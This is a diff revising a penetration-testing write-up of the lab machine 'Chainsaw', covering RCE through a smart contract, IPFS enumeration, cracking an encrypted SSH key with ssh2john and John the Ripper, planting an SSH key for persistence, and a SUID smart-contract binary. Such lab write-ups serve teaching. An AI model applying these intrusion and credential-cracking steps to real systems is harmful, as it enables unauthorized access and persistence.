@@ -111,12 +111,11 @@ contract.functions.setDomain(sys.argv[1]).transact({"from":account,"to":address}
 contract.functions.getDomain().call()
 ```
 
-
 #### Initial Shell
 
-Testing for remote code execution.
+Before trying to get a remote shell lets our theory and find if we can achive RCE. Our script will send a ping request to our VPN ip through the SmartContract.
 
-Capturing packets:
+TCP Dump to capture ping request:
 
 ```python
 
@@ -126,7 +125,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
 14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
 ```
-Now that we know we can do RCE, lets replace the ping with our payload.
+Yes we recived ICMP echo requests from our IP. Now that we know we can do RCE, lets replace the ping with our payload.
 
 ###### Running the exploit
 
@@ -148,7 +147,6 @@ administrator@chainsaw:/opt/WeaponizedPing$
 Before doing anything i upgraded the shell to a fully tty. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 
 
 ###### System Enumeration :
-I dropped my SSH public key into the /home/administrator/.ssh/authorized_keys file so i can get into the system easily, without having to run the exploit again and again.
 
 Checked to see if their is anyother users in the system, i can see user bobby which we might have to escalate to. 
 
@@ -162,7 +160,7 @@ administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:
 administrator@chainsaw:/home$ 
 ```
 
-Interesting files in maintain folder
+Interesting files in maintain folder.
 
 ```python
 
@@ -264,7 +262,8 @@ drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
 -rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
 administrator@chainsaw:/home/administrator/.ipfs$ 
 ```
-I searched for files containing bobby inside ipfs folder grep -iRl bobby and found few IPFS blocks which contains bobby's data. In IPFS, a block refers to a single unit of data, identified by its key (hash).
+There are a lot of files in the folde, so to filtter out unrelated stuff i searched for files containing bobby inside ipfs folder **grep -iRl bobby** and found few IPFS blocks which contains bobby's data. 
+**In IPFS, a block refers to a single unit of data, identified by its key (hash)**
 
 ```python
 
@@ -320,6 +319,8 @@ RGVwYXJ0bWVudDxicj48L2Rpdj4=
 ```
 ###### Base64 decoded 
 
+Mail body: 
+
 ```python
 
 
@@ -374,7 +375,7 @@ PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
 
 ###### Cracking Password
 
-To decrypt the key we need to use ssh2john and convert the encrypted RSA Private Key into a hash format and feed it to JTR.
+The file is encrypted with  triple DES with CBC mode. To decrypt the key we need to use ssh2john and convert the encrypted RSA Private Key into a hash format and feed it to JTR.
 
 ```python
 
@@ -415,14 +416,14 @@ bobby@chainsaw:~$ wc -l user.txt
 ```
 
 ###### Priviledge Escalation
-During enumeration i noticed few interesting files in bobbys home. In addition to user.txt, there are two folders in bobby’s homedir:
+During the enumeration for root i noticed few interesting files in bobbys home. In addition to user.txt, there are two folders in bobby’s homedir:
 ```python
 
 bobby@chainsaw:~$ ls
 projects  resources  user.txt
 bobby@chainsaw:~$ 
 ```
-resources folder contains documentation related to IPFS:
+Resources folder contains documentation related to IPFS:
 
 ```python
 
@@ -430,8 +431,7 @@ bobby@chainsaw:~/resources$ ls
 InterPlanetary_File_System.pdf  IPFS-Draft.pdf  IPFS-Presentation.pdf
 
 ```
-
-Project folder contains few files related smart contract a SUID binary:
+Project folder contains few files related smart contract and a SUID binary:
 
 ```python
 bobby@chainsaw:~/projects$ ls -la
@@ -444,6 +444,7 @@ drwxrwxr-x 2 bobby bobby 4096 Jan 23  2019 ChainsawClub
 Another smart contract, Looks like we’re going to be doing some more smart contract exploitation.
 
 Chainsaw SUID binary:
+
 ```python
 
 bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 
@@ -468,7 +469,7 @@ Password:
 [*] Wrong credentials!
 
 ```
-Running the binary prompt for a username and password which we don't have.
+Running the binary prompt for a username and password which we don't have. Lets check the chainsawclub.sol file.
 
 
 ChainsawClub.sol:
@@ -525,4 +526,12 @@ contract ChainsawClub {
   }
 }
 ```
+Interesting functions available in the solidity file:
+
++ setUsername() and setPassword() use to create a ‘new’ account
++ setApprove() to possibly approve the user. Default is false so we may need to overwrite
++ getSupply() to get total supply from the application and getBalance() to get user balance
++ transfer() which actually performs a simple, logical transaction
++ reset() resets all variable to default values
+
 Just like before we’ll write a python script to interact with the contract.
